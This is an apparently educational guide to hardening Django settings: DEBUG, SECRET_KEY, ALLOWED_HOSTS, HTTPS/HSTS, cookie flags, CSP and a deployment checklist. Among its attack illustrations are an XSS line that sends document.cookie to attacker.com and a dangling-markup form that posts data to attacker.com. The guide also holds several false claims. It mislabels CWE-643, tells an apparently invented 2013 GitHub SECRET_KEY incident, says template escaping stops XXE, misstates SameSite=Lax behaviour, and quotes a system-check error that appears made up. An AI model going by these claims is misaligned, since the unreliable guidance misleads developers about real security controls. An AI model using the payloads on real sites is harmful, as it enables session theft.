# Django Security Configuration Hardening

## Overview

This document explains the security-hardened Django configuration applied to the DEVSEC-DEMO project. The settings follow OWASP Top 10 guidelines, Django security best practices, and CWE (Common Weakness Enumeration) mitigation strategies.

**Learning Objective:** Understand how framework settings affect security posture and why each setting matters for deployment security.

---

## Table of Contents

1. [Configuration Philosophy](#configuration-philosophy)
2. [Security Settings Explained](#security-settings-explained)
3. [Threat Models Addressed](#threat-models-addressed)
4. [Environment-Based Configuration](#environment-based-configuration)
5. [Deployment Checklist](#deployment-checklist)
6. [Common Deployment Mistakes](#common-deployment-mistakes)
7. [Testing Configuration](#testing-configuration)

---

## Configuration Philosophy

### Principles

1. **Explicit Over Implicit** - Every security setting is explicitly configured with clear intent
2. **Fail Closed** - Missing configuration raises errors rather than falling back to permissive defaults
3. **Environment-Aware** - Different security policies for development vs production
4. **Defense in Depth** - Multiple layers of protection, not relying on single mechanisms
5. **Documentation-First** - Each setting includes threat model and mitigation explanation

### Development vs Production

**Development Mode** (`ENVIRONMENT=development`)
- DEBUG can be enabled for debugging
- ALLOWED_HOSTS more permissive (localhost variations)
- HTTPS not required
- HSTS disabled
- CSP relaxed for development tools
- SECRET_KEY can use default placeholder

**Production Mode** (`ENVIRONMENT=production`)
- DEBUG must be false (enforced with error)
- ALLOWED_HOSTS must be explicitly configured
- HTTPS required (SSL redirect enabled)
- HSTS enabled with preload
- CSP strict (no inline scripts/styles)
- SECRET_KEY required from environment

---

## Security Settings Explained

### 1. DEBUG Mode

**Setting:**
```python
DEBUG = os.environ.get('DJANGO_DEBUG', 'false').lower() == 'true'
```

**Threat Model:**
- **CWE-215: Information Exposure Through Debug Information**
- DEBUG=True in production exposes:
  - Source code in error pages
  - Database queries and connection strings
  - Environment variables
  - File paths and system structure
  - Installed packages
  - Middleware stack

**Real-World Scenarios:**
```
Scenario A: Leaked Database Credentials
- Developer enables DEBUG accidentally in production
- Site throws 500 error (e.g., database dead)
- Error page shows full traceback with DB connection string
- Attacker extracts: hostname, username, database name
- Result: Complete database compromise

Scenario B: Source Code Disclosure
- DEBUG=True with static files misconfigured
- Attacker requests /admin/views.py (404 page shows source)
- Attacker retrieves admin.py with hardcoded credentials
- Result: Authentication bypass

Scenario C: Environment Variable Leakage
- DEBUG page shows os.environ from traceback
- Attacker views config page, sees API_KEY=secret_value
- Result: Third-party service compromise
```

**Mitigation:**
```python
# 1. Default to False (safe default)
DEBUG = os.environ.get('DJANGO_DEBUG', 'false').lower() == 'true'

# 2. Enforce False in production with validation
if IS_PRODUCTION and DEBUG:
    raise ValueError("DEBUG=True in production is forbidden!")
```

**Configuration:**
```bash
# Development (safe - DEBUG enabled for debugging)
export ENVIRONMENT=development
export DJANGO_DEBUG=true

# Production (safe - DEBUG disabled)
export ENVIRONMENT=production
export DJANGO_DEBUG=false
```

---

### 2. SECRET_KEY Management

**Setting:**
```python
SECRET_KEY = os.environ.get('DJANGO_SECRET_KEY')
if not SECRET_KEY:
    if IS_PRODUCTION:
        raise ValueError("SECRET_KEY not set in production!")
```

**Threat Model:**
- **CWE-321: Use of Hard-Coded Cryptographic Key**
- **CWE-798: Use of Hard-Coded Credentials**

SECRET_KEY is used for:
- Session signing and verification
- CSRF token generation
- Password reset token signing
- Cache encryption
- Message signing

**Compromise Consequences:**
```
If SECRET_KEY is compromised:
1. Session Hijacking - Forge any user's session cookie
   - Attacker creates session data: {'_auth_user_id': '1', ...}
   - Signs with compromised key
   - Gains access as any user

2. CSRF Token Forgery - Create valid CSRF tokens
   - Django signs CSRF token with SECRET_KEY
   - Attacker generates token for victim's session
   - Perform actions as victim (change password, etc.)

3. Password Reset Token Forgery - Reset any user's password
   - Django signs password reset tokens with SECRET_KEY
   - Attacker generates reset link for admin account
   - Reset admin password and take over site

4. Session Fixation - Create predefined sessions
   - Attacker creates session with known data
   - Gets victim to accept that specific session cookie
   - Hijacks authenticated session
```

**Real Attack: GitHub Incident**
```
March 2013: GitHub accidentally committed SECRET_KEY to repository
- Secret was exposed in public repository history
- Attacker could forge valid session tokens
- Could impersonate any user on github.com
- Took days to rotate SECRET_KEY across all systems
```

**Mitigation:**

```python
# 1. Must come from environment (never commit)
SECRET_KEY = os.environ.get('DJANGO_SECRET_KEY')

# 2. Fail in production if missing
if not SECRET_KEY and IS_PRODUCTION:
    raise ValueError("SECRET_KEY not set!")

# 3. Generate secure key (only once, then store in secrets manager)
# Run once: python -c 'from django.core.management.utils import get_random_secret_key; print(get_random_secret_key())'
# Output: a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z
# Store in: .env, GitHub Secrets, AWS Secrets Manager, HashiCorp Vault, etc.

# 4. Rotate when compromised or staff changes
# Rotation requires: Flush all sessions, regenerate CSRF tokens, regenerate reset tokens
```

**Best Practices:**

```bash
# Generate a strong key (only once)
python -c 'from django.core.management.utils import get_random_secret_key; print(get_random_secret_key())'

# Store in secrets manager, NOT version control
# .env (local development only)
export DJANGO_SECRET_KEY="a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z"

# GitHub: Settings > Secrets and variables > Actions > New secret
# AWS: Secrets Manager
# Kubernetes: kubectl create secret generic django-secrets

# Never:
git add .env  # ← WILL EXPOSE AND CAUSE BREACH
git commit -m "add secret key"  # ← WILL EXPOSE AND CAUSE BREACH

# Always:
echo ".env" >> .gitignore  # ← Prevent accidental commits
```

---

### 3. ALLOWED_HOSTS Configuration

**Setting:**
```python
if IS_PRODUCTION:
    hosts_string = os.environ.get('DJANGO_ALLOWED_HOSTS')
    if not hosts_string:
        raise ValueError("DJANGO_ALLOWED_HOSTS not set in production!")
    ALLOWED_HOSTS = [host.strip() for host in hosts_string.split(',')]
else:
    ALLOWED_HOSTS = ['localhost', '127.0.0.1', '[::1]']
```

**Threat Model:**
- **CWE-601: URL Redirection to Untrusted Site (Open Redirect)**
- **CWE-643: Improper Verification of HTTP Request Method Allowance (Host Header Injection)**

ALLOWED_HOSTS validates Host header to prevent:

```
Scenario A: Host Header Injection
- Browser sends: GET / HTTP/1.1\nHost: malicious.com
- Django doesn't validate Host
- Framework generates password reset links: https://malicious.com/reset/...
- Email sent to user with malicious link!
- User clicks, thinking it's legitimate
- Attacker controls the reset page, captures new password

Scenario B: DNS Rebinding Attack
- Attacker owns attacker.com
- User visits attacker.com (malicious site)
- Site makes request to http://localhost:8000/
- Django running locally, accepts request (ALLOWED_HOSTS empty)
- Response applied to attacker.com context
- CSRF bypassed: attacker's form now from "localhost"
- User's auth persists, allows CSRF exploitation

Scenario C: Cache Poisoning
- Attacker sends: GET /api/user HTTP/1.1\nHost: evil.com
- Response cached (CDN sees Host as identifying cache key)
- User visits website.com
- CDN serves cached response for evil.com
- Website assets served to wrong domain
- JavaScript/styles from evil.com executed on website.com domain
```

**Mitigation:**

```python
# 1. Explicit whitelist per environment
ALLOWED_HOSTS = []

# 2. Production: Must be configured
if IS_PRODUCTION:
    hosts_string = os.environ.get('DJANGO_ALLOWED_HOSTS')
    if not hosts_string:
        raise ValueError("Must set DJANGO_ALLOWED_HOSTS!")
    ALLOWED_HOSTS = [host.strip() for host in hosts_string.split(',')]

# 3. Development: Safe defaults
else:
    ALLOWED_HOSTS = ['localhost', '127.0.0.1', '[::1]']
```

**Configuration:**

```bash
# Development
export DJANGO_ALLOWED_HOSTS=localhost,127.0.0.1

# Production: Single domain
export DJANGO_ALLOWED_HOSTS=example.com

# Production: Multiple domains (with and without www)
export DJANGO_ALLOWED_HOSTS=example.com,www.example.com,staging.example.com

# Production: Wildcard subdomains (if behind CDN)
export DJANGO_ALLOWED_HOSTS=.example.com

# Note: Wildcard (.*) not supported by Django - list explicitly
```

---

### 4. HTTPS and Secure Transport

**Settings:**
```python
SECURE_SSL_REDIRECT = IS_PRODUCTION
SECURE_HSTS_SECONDS = 63072000 if IS_PRODUCTION else 0  # 2 years
SESSION_COOKIE_SECURE = IS_PRODUCTION
CSRF_COOKIE_SECURE = IS_PRODUCTION
```

**Threat Models:**

#### A. Man-in-the-Middle (MITM) Attack
```
Without HTTPS:
1. User on public WiFi connects to http://example.com
2. Attacker on same network: arpspoof victim  
3. Attacker intercepts HTTP traffic
4. Attacker sees: Session cookie in plain text
5. Attacker copies session cookie
6. Attacker authenticates as user

With HTTPS + SECURE_SSL_REDIRECT:
1. User requests http://example.com
2. Django redirects: 301 to https://example.com
3. Attacker intercepts redirect (but URL exposed as damage)
4. Browser follows redirect to HTTPS
5. TLS handshake establishes encrypted connection
6. Attacker cannot see traffic (encrypted with browser's TLS key)
```

#### B. HSTS (HTTP Strict-Transport-Security)
```
Without HSTS:
1. First visit: http://example.com
2. Django redirects to https
3. Attacker on network: intercepts 301 redirect
4. Stripping attack: blocks redirect, shows HTTP version
5. User sends credentials over HTTP unencrypted

With HSTS (Strict-Transport-Security: max-age=63072000):
1. First visit: Receives HSTS header
2. Browser remembers: "example.com requires HTTPS for 2 years"
3. Future visits: Browser forces HTTPS (even if link is http://)
4. Attacker cannot strip TLS anymore
5. Only at cache expiration or browser restart is HTTPS optional
```

**Mitigation:**

```python
# 1. Redirect HTTP to HTTPS in production
SECURE_SSL_REDIRECT = IS_PRODUCTION

# 2. Enable HSTS header (tells browser to always use HTTPS)
SECURE_HSTS_SECONDS = 63072000 if IS_PRODUCTION else 0  # 2 years

# 3. Include subdomains in HSTS
SECURE_HSTS_INCLUDE_SUBDOMAINS = IS_PRODUCTION

# 4. Preload into browser HSTS lists
SECURE_HSTS_PRELOAD = IS_PRODUCTION

# 5. Only send cookies over HTTPS
SESSION_COOKIE_SECURE = IS_PRODUCTION
CSRF_COOKIE_SECURE = IS_PRODUCTION
```

---

### 5. Cookie Security

**Settings:**
```python
SESSION_COOKIE_HTTPONLY = True
CSRF_COOKIE_HTTPONLY = True
SESSION_COOKIE_SAMESITE = 'Lax'
CSRF_COOKIE_SAMESITE = 'Lax'
```

**Threat Models:**

#### A. HttpOnly Flag (Prevents XSS Cookie Theft)
```
Without HttpOnly:
1. XSS vulnerability in profile page: <img src=x onerror='steal()'>
2. JavaScript runs in user's browser: document.cookie
3. Attacker sends: fetch('attacker.com?c=' + document.cookie)
4. Attacker receives session cookie
5. Attacker authenticates as victim

With HttpOnly Flag:
1. XSS vulnerability in profile page: <img src=x onerror='steal()'>
2. JavaScript runs in user's browser: document.cookie
3. Result: empty string (HttpOnly cookies not accessible to JS)
4. Attacker cannot steal cookie
5. User remains protected even with XSS
```

**Note:** CSRF token still needs to be accessible to JavaScript for CSRF protection:
```html
<!-- csrf_token in response body, JavaScript reads it -->
<input type="hidden" name="csrfmiddlewaretoken" value="...">

<!-- JavaScript reads token -->
<script>
const token = document.querySelector('[name=csrfmiddlewaretoken]').value;
</script>
```

#### B. SameSite Attribute (Prevents CSRF via Cookie Sending)
```
Without SameSite:
1. User logged into example.com
2. User visits evil.com
3. User's browser has session cookie for example.com
4. Evil.com page: <img src="https://example.com/transfer?to=attacker&amount=1000">
5. Browser sends session cookie (same-site request)
6. Example.com sees authenticated request
7. Funds transferred to attacker

With SameSite=Lax:
1. User logged into example.com  
2. User visits evil.com
3. Evil.com page: <img src="https://example.com/transfer?...">
4. Browser checks: SameSite=Lax requires same-site
5. Request from evil.com to example.com = cross-site
6. Cookie NOT SENT
7. Request lacks authentication, fails
8. Funds NOT transferred (CSRF prevented!)
```

**SameSite Values:**
- **Strict**: Only send on same-site requests (strongest, breaks some UX)
- **Lax** (Recommended): Send on same-site + top-level navigations (POST links work, images/iframes don't)
- **None**: Send always (requires Secure flag, for cross-site scenarios like embeds)

**Mitigation:**
```python
# 1. Prevent XSS theft of cookies
SESSION_COOKIE_HTTPONLY = True
CSRF_COOKIE_HTTPONLY = True

# 2. Prevent CSRF via cookie sending
SESSION_COOKIE_SAMESITE = 'Lax'
CSRF_COOKIE_SAMESITE = 'Lax'

# 3. Only send cookies over HTTPS (if enabled in production)
SESSION_COOKIE_SECURE = IS_PRODUCTION
CSRF_COOKIE_SECURE = IS_PRODUCTION
```

---

### 6. HTTP Security Headers

**Settings:**
```python
SECURE_BROWSER_XSS_FILTER = True
X_FRAME_OPTIONS = 'DENY'
SECURE_CONTENT_SECURITY_POLICY = { ... }
```

#### A. X-XSS-Protection Header
```
Protects against reflected XSS in older browsers:

Modern approach (CSP): Content-Security-Policy header
Legacy defense: X-XSS-Protection in older IE/Chrome
```

#### B. X-Frame-Options Header
```
Threat: Clickjacking Attack
1. Attacker creates page with transparent iframe
2. Iframe loads legitimate site (e.g., bank.com)
3. User sees "Withdraw $1000" button (attackers fake button)
4. User clicks visible button, actually clicks iframe button
5. Legitimate site processes action (meant for direct user)

Mitigation with X-Frame-Options:

X-Frame-Options: DENY
- Browser refuses to load page in iframe
- Clickjacking attack impossible

X-Frame-Options: SAMEORIGIN  
- Only allow framing from same domain
- Allows internal framing but not cross-site

X-Frame-Options: ALLOW-FROM https://trusted.com
- Only allow specific domain
```

**Mitigation:**
```python
X_FRAME_OPTIONS = 'DENY'  # Prevent all framing (strongest)
```

#### C. Content-Security-Policy Header
```
Threat: Cross-Site Scripting (XSS)

Attack: Injected Script
<img src=x onerror="evil_script()">

Without CSP:
- Script runs in page context
- Can access user data, forge requests, steal credentials

With CSP:
- Browser enforces policy before executing scripts
- Only scripts from whitelisted origins execute
- Inline scripts blocked by default
```

**CSP Policy Used:**
```python
SECURE_CONTENT_SECURITY_POLICY = {
    'default-src': ["'self'"],         # Load everything from same domain
    'script-src': ["'self'"],          # Scripts only from same domain
    'style-src': ["'self'"],           # Styles only from same domain
    'img-src': ["'self'", 'data:'],    # Images from same domain or inline
    'font-src': ["'self'"],            # Fonts only from same domain
    'connect-src': ["'self'"],         # AJAX/WebSocket to same domain
    'media-src': ["'self'"],           # Videos from same domain
    'object-src': ["'none'"],          # No plugins (Flash, etc.)
    'frame-ancestors': ["'none'"],     # Cannot be framed
    'base-uri': ["'self'"],            # Only same-domain base tag
    'form-action': ["'self'"],         # Forms submit to same domain
}
```

**Real CSP Bypass Examples:**
```
Without CSP:
Content-Security-Policy: default-src 'self' https://cdn.example.com

Attack: Dangling Markup Injection
<form method="post" action="https://attacker.com" id=steal>
<input name=token>
</form>
<img src="https://cdn.example.com/x?q=" onload="document.getElementById('steal').submit()">

Result: Form data sent to attacker

With improved CSP:
- form-action: 'self' (only same-domain forms)
- Prevents redirect to attacker domain
```

---

## Threat Models Addressed

### OWASP Top 10 Coverage

| OWASP | Issue | Mitigation |
|-------|-------|-----------|
| A1: Injection | SQL Injection in queries | ORM parameterizes queries |
| A2: Broken Auth | Weak session handling | SESSION_COOKIE_SECURE, HttpOnly, SameSite |
| A3: Sensitive Data Exposure | Data over HTTP | SECURE_SSL_REDIRECT, HSTS |
| A4: XML External Entities | XXE attacks | Django templates escape by default |
| A5: Broken Access Control | Unauthorized access | Authorization framework (separate assignment) |
| A6: Security Misconfiguration | DEBUG on, weak settings | This assignment addresses it |
| A7: XSS | Injected scripts | CSP, template auto-escape |
| A8: Insecure Deserialization | Pickle attacks | Avoid pickle for untrusted data |
| A9: Using Components with Known Vulnerabilities | Outdated packages | Dependency scanning (not in this assignment) |
| A10: Insufficient Logging | Undetected breaches | Logging framework configured |

### CWE Coverage

- CWE-215: Information Exposure Through Debug Information
- CWE-321: Use of Hard-Coded Cryptographic Key
- CWE-434: Unrestricted Upload of File with Dangerous Type
- CWE-601: URL Redirection to Untrusted Site
- CWE-643: Improper Verification of HTTP Request Method Allowance

---

## Environment-Based Configuration

### Development Setup
```bash
# .env (development)
ENVIRONMENT=development
DJANGO_DEBUG=true
DJANGO_SECRET_KEY=dev-placeholder-key
DJANGO_ALLOWED_HOSTS=localhost,127.0.0.1
```

### Production Setup
```bash
# Production environment variables (never in .env or version control)
# Use secrets manager (AWS, Vault, etc.)
ENVIRONMENT=production
DJANGO_DEBUG=false
DJANGO_SECRET_KEY=$(openssl rand -base64 32)  # Generated
DJANGO_ALLOWED_HOSTS=example.com,www.example.com
```

---

## Deployment Checklist

Before deploying to production, verify:

```bash
# 1. Run Django's security checks
python manage.py check --deploy

# 2. Verify settings are production-hardened
- ENVIRONMENT=production
- DEBUG=false
- SECRET_KEY set and strong
- ALLOWED_HOSTS configured
- SECURE_SSL_REDIRECT=True
- HSTS enabled
- Cookie security enabled

# 3. Verify reverse proxy configured
- SSL certificate installed
- X-Forwarded-Proto header set to https
- X-Forwarded-For configured for client IP

# 4. Verify file permissions
- media/ directory writable by app user
- logs/ directory writable by app user
- staticfiles collected (python manage.py collectstatic)

# 5. Verify secrets management
- SECRET_KEY in secrets manager
- Database credentials in secrets manager
- No secrets in version control
- .env-prod added to .gitignore

# 6. Test security headers
curl -I https://example.com
# Verify headers present:
# Strict-Transport-Security
# X-Frame-Options: DENY
# X-Content-Type-Options: nosniff
# X-XSS-Protection: 1; mode=block
# Content-Security-Policy

# 7. Rotate SECRET_KEY when
- Suspected compromise
- Significant staff changes
- Annual rotation policy
```

---

## Common Deployment Mistakes

### ❌ Mistake 1: DEBUG=True in Production
```python
# WRONG
DEBUG = os.environ.get('DJANGO_DEBUG', True)  # Defaults to True!

# RIGHT
DEBUG = os.environ.get('DJANGO_DEBUG', 'false').lower() == 'true'
```

### ❌ Mistake 2: Empty ALLOWED_HOSTS
```python
# WRONG
ALLOWED_HOSTS = []  # Allows only localhost!

# RIGHT
ALLOWED_HOSTS = os.environ.get('DJANGO_ALLOWED_HOSTS', 'localhost').split(',')
```

### ❌ Mistake 3: SECRET_KEY in Version Control
```python
# WRONG
SECRET_KEY = 'django-insecure-abc123...'  # Committed to GitHub!

# RIGHT
SECRET_KEY = os.environ.get('DJANGO_SECRET_KEY')
if not SECRET_KEY:
    raise ValueError("Set DJANGO_SECRET_KEY")
```

### ❌ Mistake 4: Trusting Client Headers Without Proxy Configuration
```python
# WRONG
USE_X_FORWARDED_HOST = True  # But proxy doesn't send these headers!
USE_X_FORWARDED_PORT = True

# RIGHT
# Only if reverse proxy is configured to send these headers
# Verify proxy configuration explicitly
USE_X_FORWARDED_HOST = IS_PRODUCTION and os.environ.get('TRUST_PROXY_HEADERS') == 'true'
```

### ❌ Mistake 5: No HTTPS Redirect
```python
# WRONG
SECURE_SSL_REDIRECT = False  # HTTP traffic allowed!

# RIGHT
SECURE_SSL_REDIRECT = IS_PRODUCTION
```

### ❌ Mistake 6: Insecure Cookies
```python
# WRONG
SESSION_COOKIE_SECURE = False  # Sent over HTTP!
SESSION_COOKIE_HTTPONLY = False  # Stealable via XSS!

# RIGHT
SESSION_COOKIE_SECURE = IS_PRODUCTION
SESSION_COOKIE_HTTPONLY = True
```

---

## Testing Configuration

### Admin Command Check
```bash
python manage.py check --deploy
```

This runs all security-relevant checks:
```
System check identified 3 issues (0 silenced).

SystemCheckError: System check identified some issues:

ERRORS:
?: (security.E001) SecurityMiddleware is not enabled; enable it with
MIDDLEWARE = ['django.middleware.security.SecurityMiddleware', ...].

?: (security.E002) You must set ALLOWED_HOSTS when DEBUG is False.

?: (security.E101) SECURE_CONTENT_SECURITY_POLICY_EXCLUDE_URLS... (set it)
```

### Manual Verification
```bash
# Check security headers
curl -I https://example.com

# Expected output includes:
# Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
# X-Frame-Options: DENY
# X-Content-Type-Options: nosniff
# Content-Security-Policy: default-src 'self' ...
```

### Browser DevTools
1. Open Network tab
2. Make request to site
3. Check Response Headers for security headers
4. Check cookies for Secure, HttpOnly, SameSite flags

---

## Summary

The hardened Django configuration implements:

✅ **Defense in Depth** - Multiple layers of security controls
✅ **Environment Awareness** - Different policies for dev vs prod
✅ **Explicitness** - Every setting has clear intent
✅ **Fail Closed** - Errors raised on misconfiguration
✅ **Standards Compliance** - OWASP Top 10, CWE, security best practices

This creates a foundation for secure deployment while maintaining development flexibility.
